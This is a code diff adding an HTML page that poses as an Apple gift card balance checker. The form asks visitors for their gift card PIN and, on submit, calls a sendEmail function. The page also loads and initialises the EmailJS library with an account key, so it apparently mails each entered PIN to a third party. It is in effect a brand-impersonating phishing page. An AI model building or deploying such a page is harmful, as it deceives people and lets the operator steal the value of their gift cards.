@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="newlogo.jpg">
+    <link rel="stylesheet" href="app.js">
+    <title>Apple</title>
+</head>
+<body>
+
+    <header>
+        <div>
+            <img class="logo" src="download.png" alt="">
+            <h4 class="apple">Apple Gift Card</h4>
+        </div>
+        <div>
+            <div class="transparent">
+                <img class="logo" src="search-icon.png" alt="">
+                <img class="logo" src="cart.png" alt="">
+                <img class="logo" src="nav.png" alt="">
+            </div> 
+            
+        </div>
+        
+    </header>
+
+    <section class="check">
+        <div>
+            Check Your Apple Gift Card Balance
+        </div>   
+    </section>
+
+    <section class="center-pics">
+        <div>
+            <img class="newlogo" src="newlogo.jpg" alt="">
+        </div>
+    </section>
+
+  
+       
+    <form class="flex" onsubmit="sendEmail(); reset(); return false;">
+
+        <label class="enter" for="enter"> Enter Your PIN Here :</label>
+        <input id="enter" type="text" placeholder="Gift Card PIN" required>
+       
+        <button type="submit"  class="checkb" >
+            Check Balance  
+        </button>
+     </form>
+
+    <div class="footer">
+        Your gift card balance never expires and is non-transferrable after first use.
+    </div>
+  
+    <script src="app.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+    (function(){
+      emailjs.init("BdTDyILrJi24U7ZCS");
+    })();
+    </script>
+</body>
+</html>
